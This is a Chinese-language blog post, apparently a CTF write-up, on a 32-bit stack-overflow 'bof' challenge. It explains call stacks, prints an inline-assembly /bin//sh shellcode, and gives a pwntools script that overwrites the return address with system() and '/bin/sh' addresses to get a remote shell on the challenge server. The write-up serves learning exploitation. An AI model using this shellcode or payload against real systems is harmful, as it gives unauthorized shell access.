---
layout:     post   				    # 使用的布局（不需要改）
title:      pwn-bof	# 标题 
#subtitle:   脚本，xss #副标题
date:       2020-05-19 				# 时间
author:     s-seven 						# 作者
header-img: img/post-bg-2015.jpg 	#这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								#标签
    - pwn
---

这两天改论文改的焦头烂额。。。bof这道题是第一阶段的时候做的了，但是当时没有及时记录下来，这两天又重新看了看。pwn真的好难啊

首先是几天预备知识，比如函数调用栈，栈溢出，shellcode等等

# 函数调用栈

栈是在函数被调用的时候开辟，函数返回的时候销毁，结构是这样的：

[![YIWkSx.png](https://s1.ax1x.com/2020/05/19/YIWkSx.png)](https://imgchr.com/i/YIWkSx)

每个栈的结构是一样的，其中bp寄存器是基址指针寄存器，指向栈帧的底部；sp寄存器是栈指针寄存器，指向栈帧的栈顶。栈从高地址向低地址生长。

在调用一个函数时，call指令做了两件事：

1. 将下一条指令的返回值入栈
2. 跳转到被调用函数入口点

这就是一个简单的函数调用栈。

#栈溢出

函数的参数分布在低地址的一端，但是有些操作是不检查缓冲区大小的，所以如果我们输入的参数覆盖掉了bp和return addr的内容时，就可以利用这个漏洞。

栈溢出漏洞的利用步骤：

1. 找到能够刚好覆盖返回地址的缓冲区长度
2. 填充shellcode并找到shellcode所在地址
3. 将返回地址覆盖为shellcode地址

# shellcode

shellcode是指一段能够控制目标程序的代码。

前几天长亭科技的公开课中讲了一些关于shellcode的知识，链接https://www.bilibili.com/video/BV1Sz411B76y?t=354

里面介绍了一个简单的shellcode：

```C
void shellcode()
{
	__asm__(
	"xor %eax,%eax\n\t"
	"pushl %eax\n\t"
	"push $0x68732f2f\n\t"     //压栈//sh
	"push $0x6e69622f\n\t"     //压栈/bin
	"pushl %ebx\n\t"
	"movl %esp,%ecx\n\t"   //ecx=['/bin//sh',0]
	"cltd\n\t"
	"movb $0xb,%al\n\t"    //syscall number
	"int $0x80\n\t"        //执行系统调用中断
	"movl %esp,%ebx\n\t"
	"pushl %eax\n\t"
	);
}
int main(int argc, char** argv)
{
	shellcode();
	return 0;
}
```

//sh和/sh是一样的，只不过是为了凑四个字节,这就是system('/bin//sh')函数

然后 执行一下：

[![YIW31P.png](https://s1.ax1x.com/2020/05/19/YIW31P.png)](https://imgchr.com/i/YIW31P)这就是一个简单的shellcode

# bof

有了以上知识，我们来看一下这道题目

拖进ida里面拿到源码：

```c
ssize_t sub_8048573()
{
  char buf; // [esp+Ch] [ebp-1Ch]

  sub_804851B();
  sub_804854A();
  puts("can you pwn me?");
  return read(0, &buf, 0x100u);
}
```

很容易的想到read函数可以利用栈溢出。这个函数读了0x100u大小的数据，我们需要找到能够刚好覆盖返回地址的缓冲区长度

buf距离ebp有1c的长度，显然我们输入的大小大于这个长度，我们需要填充1c+4=32个字节长度，因为 pwn 是一个 32 位的 ELF 文件，所以我们还需要填充 4 个字节的数据

同时我们要获取shell，也就是system('/bin/sh')函数，return addr应该是这个函数的地址。

```
.plt:080483F0 ; int system(const char *command)
.plt:080483F0 _system         proc near               ; CODE XREF: sub_804854A+1E↓p
.plt:080483F0
.plt:080483F0 command         = dword ptr  4
```

找到system的地址0x080483F0

[![YIhzm8.png](https://s1.ax1x.com/2020/05/19/YIhzm8.png)](https://imgchr.com/i/YIhzm8)

找到/bin/sh的地址0x0804A02C

得到地址之后实现我们的脚本：

```python
from pwn import *

r = remote('vps1.blue-whale.me',9990)
system_address = 0x080483F0
bin_sh_address = 0x0804A02C

payload = 'a'*32 + p32(system_address) + 'a'*4 + p32(bin_sh_address)

r.send(payload)
r.interactive()  
```

运行脚本得到flag